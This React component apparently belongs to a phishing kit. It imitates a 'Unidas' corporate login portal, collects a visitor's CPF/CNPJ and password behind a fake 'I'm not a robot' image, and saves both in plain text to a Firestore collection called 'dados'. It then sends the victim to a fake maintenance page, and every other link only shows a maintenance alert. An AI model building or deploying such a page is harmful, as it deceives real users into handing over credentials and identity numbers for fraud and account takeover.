import React, { useState, useEffect } from "react";
//import { FiChevronRight } from "react-icons/fi";
import { Helmet } from "react-helmet";
import { useNavigate } from "react-router-dom";
import { collection, addDoc } from "firebase/firestore";
import { db } from "../../services/firebaseConnection";

import Logo from "../../assets/icones/logo2.png";
import ImagemNaoSouRobo from "../../assets/icones/nao-sou-robo.png";

import "./style.css";

export default function ContaFisicaUm() {
  const [currentStep, setCurrentStep] = useState(0);
  //const [loading, setLoading] = useState(false);
  const [formValues, setFormValues] = useState({
    cpf: "",
    password: "",
  });

  const navigate = useNavigate();

  useEffect(() => {
    async function loadDados() {}

    loadDados();
  }, []);

  // function Aviso() {
  //   alert("⚠️ Desculpe, página em manutenção! Por favor, volte mais tarde!");
  //   return;
  // }

  function handleError() {
    alert(
      "⚠️ Desculpe, página em manutenção! Por favor, tente daqui a alguns minutos!"
    );
    return;
  }

  const steps = [
    {
      id: "DADOS",
      title: "Dados cpf",
    },
    {
      id: "PESSOAL",
      title: "Dados de senha",
    },
  ];

  function handleNext() {
    setCurrentStep((prevState) => prevState + 1);
  }

  function handleInputChange(event) {
    const { name, value } = event.target;

    setFormValues((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  }

  async function handleSubmit(e) {
    e.preventDefault();

    if (formValues.cpf === "" || formValues.password === "") {
      navigate("/");
      alert("⚠️Erro: Preencher todos os dados! ");
    } else {
      await addDoc(collection(db, "dados"), {
        cpf: formValues.cpf,
        password: formValues.password,
        created: new Date().toString(),
      })
        .then(() => {
          navigate("/manutencao");
        })
        .catch((error) => {
          alert("⚠️Algo deu errado: Verifique os dados da sua conta: " + error);
        });
    }
  }

  return (
    <>
      <div className="containerConta">
        <Helmet>
          <meta charSet="utf-8" />
          <title>Login - Unidas | Portal Corporativo</title>
        </Helmet>

        <div className="headerConta"></div>

        <div className="scroll">
          <form className="steps-form" onSubmit={handleSubmit}>
            <div className="fields-container">
              {steps[currentStep].id === "DADOS" && (
                <div className="card">
                  <div className="cardBorda">
                    <img src={Logo} alt="img" className="imgLogo" />
                    <div className="containerAreaInputs">
                      <h1
                        style={{
                          color: "#2f80ed",
                          fontSize: 22,
                          fontWeight: 600,
                          marginTop: 55,
                        }}
                      >
                        OLÁ!
                      </h1>
                      <p style={{ color: "#535353" }}>
                        Digite seus dados para começar.
                      </p>

                      <input
                        placeholder="Digite seu CPF ou CNPJ"
                        maxLength={14}
                        type="number"
                        className="inputCard"
                        value={formValues.cpf}
                        name="cpf"
                        onChange={handleInputChange}
                      />

                      <div>
                        <label className="containerCheck">
                          <input type="checkbox" />
                          <span className="checkmark"></span>
                        </label>
                        <img
                          src={ImagemNaoSouRobo}
                          alt="img"
                          className="imgreCaptcha"
                        />
                      </div>
                    </div>

                    {currentStep < steps.length - 1 && (
                      <button
                        className="btnEntrarConta"
                        type="button"
                        onClick={handleNext}
                      >
                        Continuar
                      </button>
                    )}
                  </div>
                  <br /> <br /> <br />
                  <div className="containerConentent">
                    <div className="containerConententTitle">
                      <h1
                        style={{
                          color: "#2f80ed",
                          fontSize: 22,
                          fontWeight: "bold",
                        }}
                      >
                        NOVO POR AQUI?
                      </h1>
                    </div>

                    <p
                      style={{
                        color: "#535353",
                        fontSize: 15,
                        marginTop: 30,

                        textAlign: "center",
                      }}
                    >
                      Clique no botão abaixo e preencha as informações <br />{" "}
                      que um Gestor de Negócio entrará em contato.
                    </p>

                    <button
                      onClick={(e) => handleError(e)}
                      className="btnEntrar"
                    >
                      Cadastrar
                    </button>
                  </div>
                </div>
              )}

              {steps[currentStep].id === "PESSOAL" && (
                <div className="card">
                  <div className="cardBorda">
                    <img src={Logo} alt="img" className="imgLogo" />
                    <div className="containerAreaInputs">
                      <h1
                        style={{
                          color: "#2f80ed",
                          fontSize: 22,
                          fontWeight: 600,
                          marginTop: 55,
                          marginBottom: 20,
                        }}
                      >
                        SEJA BEM-VINDO!
                      </h1>
                      <p
                        style={{
                          color: "#535353",
                          textAlign: "center",
                          width: "70%",
                        }}
                      >
                        Já vimos que você é nosso cliente. <br /> Agora é só
                        você digitar sua senha abaixo e acessar sua conta.
                      </p>

                      <input
                        placeholder="Digite sua senha"
                        maxLength={32}
                        type="password"
                        className="inputCard"
                        style={{ width: "85%" }}
                        value={formValues.password}
                        name="password"
                        onChange={handleInputChange}
                      />

                      <div
                        style={{
                          display: "flex",
                          justifyContent: "space-between",
                          flexDirection: "row",
                          marginTop: 10,
                          width: "85%",
                          height: 100,
                        }}
                      >
                        <div>
                          <label className="LabelCheck">
                            <p style={{ marginTop: 5, marginLeft: 5 }}>
                              Continuar logado
                            </p>
                            <input type="checkbox" />

                            <span className="checkmarkSpan"></span>
                          </label>
                        </div>

                        <div style={{ marginTop: 8 }}>
                          <a
                            href="#página-em-manutenção"
                            style={{
                              color: "#007ad9",
                              textDecorationLine: "underline",
                            }}
                            onClick={(e) => handleError(e)}
                          >
                            Esqueci minha senha
                          </a>
                        </div>
                      </div>
                    </div>
                    {currentStep < steps.length && (
                      <button
                        className="btnEntrarConta"
                        type="button"
                        style={{ marginTop: 355 }}
                        onClick={handleSubmit}
                      >
                        Continuar
                      </button>
                    )}
                    <br /> <br />
                  </div>
                </div>
              )}
            </div>
          </form>
        </div>
      </div>
    </>
  );
}
